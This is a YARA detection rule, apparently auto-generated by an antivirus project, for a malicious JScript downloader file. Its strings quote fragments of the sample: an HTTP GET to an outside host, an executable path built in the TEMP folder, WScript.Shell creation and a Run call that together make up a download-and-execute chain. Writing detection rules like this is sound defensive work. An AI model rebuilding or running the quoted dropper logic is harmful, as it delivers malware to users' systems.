rule sig_20160329_21bf7eb5dd1b8eee3ed0b1df9647899b {
  meta:
    description = "datamaliciousorder - file 20160329_21bf7eb5dd1b8eee3ed0b1df9647899b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "622fdf1293c8ea95936af3f70bd3c60845c5366192346cfd0deb74adbbb3d57f"

  strings:
    $s1  = "c[WE](\"GET\", \"http://energq.com/e3ola\", false);" fullword ascii
    $s2  = "function tY() {return vu[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"T81BGM4pt.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[T](Mi() * 11); if (c[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var vu = function B() {return WScript[if0](\"WScript.Shell\");}(), d = 11;" fullword ascii
    $s5  = "function k(lu, L){tx = tx * 1; return lu - L;};" fullword ascii
    $s6  = "function o(){return \"\" + b;};" fullword ascii
    $s7  = "function cO() {return ((Dh == true) && (Dh == Hv0)) ? 1 : tx;};" fullword ascii
    $s8  = "function l(I){vu[\"Run\"](I, tx, tx);};" fullword ascii
    $s9  = "return k(Rl, R);" fullword ascii
    $s10 = "function SK(){return if0;};" fullword ascii
    $s11 = "var a = new this[\"Date\"]();" fullword ascii
    $s12 = " while (Yg){" fullword ascii
    $s13 = "function Mi(){return 22;};" fullword ascii
    $s14 = "function dC(Ug) {var J = (1, 2, 3, 4, 5, Ug); return J;};" fullword ascii
    $s15 = "Hv0 = true; " fullword ascii
    $s16 = "Dh = true; " fullword ascii
    $s17 = "var vC = false;" fullword ascii
    $s18 = "var Dh = false;" fullword ascii
    $s19 = "var Hv0 = false;" fullword ascii
    $s20 = "} catch(kU){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}